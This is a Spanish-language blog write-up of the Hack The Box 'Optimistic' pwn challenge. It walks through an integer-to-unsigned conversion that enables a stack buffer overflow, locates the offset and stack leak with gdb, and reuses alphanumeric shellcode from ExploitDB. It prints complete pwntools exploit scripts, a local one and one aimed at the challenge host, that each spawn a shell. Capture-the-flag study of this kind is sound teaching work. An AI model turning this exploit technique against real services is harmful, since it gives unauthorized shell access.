---
title: Optimistic - Pwn Challenge (HTB) ❤
author: sha-16
categories: [linux, binary exploitation, htb]
tags: [linux, pwn, htb, 64-bit] 
---

Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation. 

En esta ocasión, les traigo la resolución de un BoF en un binario de 64-bit. El desafío como tal, consiste en un programa que simplemente te solicita datos “personales”:

- Correo
- Edad
- N° de caracteres que tendrá el nombre
- Nombre

![Untitled](/assets/img/htb/pwn/Optimistic/Untitled.png)

Como se visualiza en imagen, el programa te exfiltra directamente una dirección de memoria, la cual por ahora desconocemos.

Para empezar, es importante chequear si es que el programa cuenta con algún tipo de protección jodida de evadir:

![Untitled](/assets/img/htb/pwn/Optimistic/Untitled%201.png)

Como se puede ver no existen protecciones importantes que nos hiciesen imposible el camino de explotación.

Por lo tanto, lo primero que hacemos es reversear el código con Ghidra:

```c
void main(void)

{
  int checker_length;
  ssize_t user_input;
  uint length_user_name;
  undefined4 user_age;
  undefined2 user_email;
  char user_option;
  undefined no_option;
  undefined user_input_email [8];
  undefined user_input_age [8];
  char user_input_name [96];
  
  initialize();
  puts("Welcome to the positive community!");
  puts("We help you embrace optimism.");
  printf("Would you like to enroll yourself? (y/n): ");
  checker_length = getchar();
  user_option = (char)checker_length;
  getchar();
  if (user_option != 'y') {
    puts("Too bad, see you next time :(");
    no_option = 'n';
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  printf("Great! Here\'s a small welcome gift: %p\n",&stack0xfffffffffffffff8);
  puts("Please provide your details.");
  printf("Email: ");
  user_input = read(0,user_input_email,8);
  user_email = (undefined2)user_input;
  printf("Age: ");
  user_input = read(0,user_input_age,8);
  user_age = (undefined4)user_input;
  printf("Length of name: ");
  __isoc99_scanf(&DAT_00102104,&length_user_name);
  if (64 < (int)length_user_name) {
    puts("Woah there! You shouldn\'t be too optimistic.");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  printf("Name: ");
  user_input = read(0,user_input_name,(ulong)length_user_name);
  length_user_name = 0;
  while( true ) {
    if ((int)user_input + -9 <= (int)length_user_name) {
      puts("Thank you! We\'ll be in touch soon.");
      return;
    }
    checker_length = isalpha((int)user_input_name[(int)length_user_name]);
    if ((checker_length == 0) && (9 < (int)user_input_name[(int)length_user_name] - 0x30U)) break;
    length_user_name = length_user_name + 1;
  }
  puts("Sorry, that\'s an invalid name.");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

Como se puede ver en el siguiente fragmento de código el programa solicita el tamaño en bytes que va a tener el nombre del usuario. Es curioso mencionar que la única validación que se efectúa, en este aspecto, es que el número ingresado no sea mayor a `64`.

```c
printf("Length of name: ");
__isoc99_scanf(&DAT_00102104,&length_user_name);
if (64 < (int)length_user_name) {
  puts("Woah there! You shouldn\'t be too optimistic.");
                  /* WARNING: Subroutine does not return */
  exit(0);
}
```

El nombre del usuario tiene reservado `96 bytes` por lo que, en primera instancia, no podríamos generar un length mayor que nos permitiese desbordar el buffer.

Otro punto importante a considerar, es que cuando el nombre del usuario es solicitado, el length de este se formatea de *Integer* a *Unsigned Long*.

```c
printf("Name: ");
user_input = read(0,user_input_name,(ulong)length_user_name);
```

Considerando los dos puntos mencionados anteriormente, la conclusión es que podemos explotar un *Integer Overflow*:

- Se puede introducir un dato *Integer* menor a 0.
- El dato *Integer* se formatea a *Unsigned Long*.

Para dar más contexto, los lenguajes de programación permiten definir datos de tipo *Integers*. Este tipo de datos tienen un límite numérico (tanto superior como inferior), el cual, si llega a ser sobrepasado, provocará que el programa entregue un resultado con un valor erróneo. Por ejemplo, en lenguaje **C**: el número *Integer* límite es `2147483647`. Si nosotros tratamos de hacer un `print` de `2147483648`, el programa entregará por resultado `-2147483648`, lo cual es erróneo debido a que se ha generado un *overflow* del entero.

![Untitled](/assets/img/htb/pwn/Optimistic/Untitled%202.png)

Otro punto a considerar es que, si nosotros formateamos un *Integer* con valor negativo, como `-1` a *Unsigned Long*, este cambiará su valor al límite superior de datos *Unsigned Long,* que corresponde a `18446744073709551615 (0xffffffffffffffff)`. Esto ocurre porque los valores *Unsigned* siempre van del `0` en adelante (hasta su respectivo límite).

![Untitled](/assets/img/htb/pwn/Optimistic/Untitled%203.png)

Aplicando esta misma lógica en el reto, podríamos introducir un número `-1` en el *length* del nombre, y de esta manera indicarle a la función `read` que asigne más de `64 bytes` para el valor a almacenar en la variable `user_input_name`. De esta forma, aprovechamos la conversión a `ulong` que se ejecuta dentro de la función `read`.

Como se puede ver a continuación, el programa acepta correctamente el *length* `-1`. Por lo tanto, hecho esto, se introduce una cadena de `150 bytes`, superior al espacio asignado para la variable `user_input_name`, lo que causa que el programa arroje un error `Segmentation fault` por desbordamiento de buffer.

![Untitled](/assets/img/htb/pwn/Optimistic/Untitled%204.png)

Ahora, por ejemplo, si metemos `2147483648` en el *length* del nombre, también estaríamos explotando el desbordamiento de enteros, lo cual de igual forma nos permitirá desbordar el buffer del programa, ya que el espacio asignado en la función `read` será mayor al espacio reservado para la variable de `96 bytes` donde se almacena el nombre ingresado.

En la siguiente imagen, se puede ver que se ingresa el número `2147483648` en el *length* del nombre. Es importante recordarles que, por el *Integer Overflow*, este se almacenará como `-2147483648`, el cual posteriormente al ser convertido a *Unsigned Long* dará como resultado un número “erróneo” mucho mayor a `0` y a `96 bytes`. 

![Untitled](/assets/img/htb/pwn/Optimistic/Untitled%205.png)

Habiendo identificado la existencia del BoF, podemos proceder a debuggear el programa con la herramienta `gdb-gef`.

Primeramente, tenemos que tratar de identificar el `offset`, por lo que utilizamos `pattern create` para generar una cadena de `150 bytes`:

![Untitled](/assets/img/htb/pwn/Optimistic/Untitled%206.png)

Posterior a esto arrancamos el programa, explotamos el *Integer Overflow* y colocamos nuestra cadena de `150 bytes` para desbordar el buffer y encontrar el `offset`:

![Untitled](/assets/img/htb/pwn/Optimistic/Untitled%207.png)

Como se logra ver en la imagen, el `offset` corresponde a `104 bytes`.

Antes de inyectar nuestro payload final, con el `shellcode` y todo, tenemos que saber la distancia que existe entre la dirección de memoria que se likea con la dirección de memoria de la variable que almacena el nombre ingresado. 

Este es un paso necesario, ya que necesitamos que la dirección de memoria que ingresemos en el payload apunte hacía la dirección de memoria donde se encuentre cargado nuestro `shellcode`, la cual corresponde justamente a la de la variable que almacena el nombre ingresado.  

Para esto, inyectaremos la siguiente cadena, la cual nos permitirá localizar la dirección de memoria, dependiendo de donde se encuentre la coincidencia `AAAAAAAA`:

```
AAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```

Como se muestra en imagen, la coincidencia es identificada con éxito en la dirección `0x7fffffffe110`:

![Untitled](/assets/img/htb/pwn/Optimistic/Untitled%208.png)

De esta manera, restando la dirección de memoria likeada (`0x7fffffffe170`) con la identificada a partir de la cadena `AAAAAAAA` (`0x7fffffffe110`), podremos saber la localización específica de la variable `user_input_name`, en la memoria:

![Untitled](/assets/img/htb/pwn/Optimistic/Untitled%209.png)

Como se puede ver, el resultado indica que la dirección de memoria de la variable `user_input_name` se encuentra a `96 bytes` de la dirección de memoria likeada, lo cual se traduce en `0x7fffffffe170 - 0x60`:

![Untitled](/assets/img/htb/pwn/Optimistic/Untitled%2010.png)

Antes de finalizar, existe un pequeño problema, debido a que el código que inyectemos pasará por medio de la siguiente condicional, la cual se encarga de validar que todos los caracteres introducidos en el `user_input_name` sean alfanuméricos. 

Si metemos un `shellcode` común y corriente, computado con `MSFvenom`, el programa nos arrojará el error `Sorry, that's an invalid name`: 

```python
checker_length = isalpha((int)user_input_name[(int)length_user_name]);
if ((checker_length == 0) && (9 < (int)user_input_name[(int)length_user_name] - 0x30U)) break;
	length_user_name = length_user_name + 1;
```

Dado esto, utilizamos el siguiente `shellcode`, público en [ExploitDB](https://www.exploit-db.com/exploits/35205), el cual es completamente alfanumérico y permite ejecutar una `/bin/sh`, de manera directa:

![Untitled](/assets/img/htb/pwn/Optimistic/Untitled%2011.png)

Teniendo esto en consideración, desarrollamos el siguiente exploit, el cual se nos permite explotar binario de forma local con éxito: 

```python
#!/usr/bin/env python3

from pwn import process, p64, log

if __name__ == '__main__':
    p = process(b'./optimistic')
    p.sendlineafter(b'Would you like to enroll yourself? (y/n): ', b'y')

    # Extracting Stack Leak
    p.recvuntil(b'Great! Here\'s a small welcome gift: ')
    stack_leak = p.recvline().decode()
    stack_leak_addr = p64(int(stack_leak, 16) - 0x60)

    log.info(f"Stack Leaked Address: f{stack_leak}")
        
    p.sendafter(b'Email: ', b'a')
    p.sendafter(b'Age: ', b'-1')

    # Exploiting Integer Overflow
    p.sendlineafter(b'Length of name: ', b'-1')

    # Shellcode
    offset = 104
    shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
    padding = b'\x41' * (offset - len(shellcode)) 
    payload = shellcode + padding + stack_leak_addr
     
    p.sendafter(b'Name: ', payload)
    p.interactive()
```

Como se muestra en imagen, el exploit nos entrega una `shell` interactiva de forma inmediata:

![Untitled](/assets/img/htb/pwn/Optimistic/Untitled%2012.png)

Para completar el desafío, sólo debemos adaptar el exploit para que se conecte al host de HackTheBox con la función `remote`, en lugar de `process`:

```python
#!/usr/bin/env python3

from pwn import remote, p64, log

if __name__ == '__main__':
    p = remote('206.189.121.78', 31545)
    p.sendlineafter(b'Would you like to enroll yourself? (y/n): ', b'y')

    # Extracting Stack Leak
    p.recvuntil(b'Great! Here\'s a small welcome gift: ')
    stack_leak = p.recvline().decode()
    stack_leak_addr = p64(int(stack_leak, 16) - 0x60)

    log.info(f"Stack Leaked Address: f{stack_leak}")
        
    p.sendafter(b'Email: ', b'a')
    p.sendafter(b'Age: ', b'-1')

    # Exploiting Integer Overflow
    p.sendlineafter(b'Length of name: ', b'-1')

    # Shellcode
    offset = 104
    shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
    padding = b'\x41' * (offset - len(shellcode)) 
    payload = shellcode + padding + stack_leak_addr
     
    p.sendafter(b'Name: ', payload)
    p.interactive()
```

Y ya con esto, el desafío está `pwned`:

![Untitled](/assets/img/htb/pwn/Optimistic/Untitled%2013.png)

### References

- What is an Integer Overflow (Acunetix): [https://www.acunetix.com/blog/web-security-zone/what-is-integer-overflow/](https://www.acunetix.com/blog/web-security-zone/what-is-integer-overflow/)
- C and C++ Integer Limits (Microsoft): [https://learn.microsoft.com/es-es/cpp/c-language/cpp-integer-limits](https://learn.microsoft.com/es-es/cpp/c-language/cpp-integer-limits)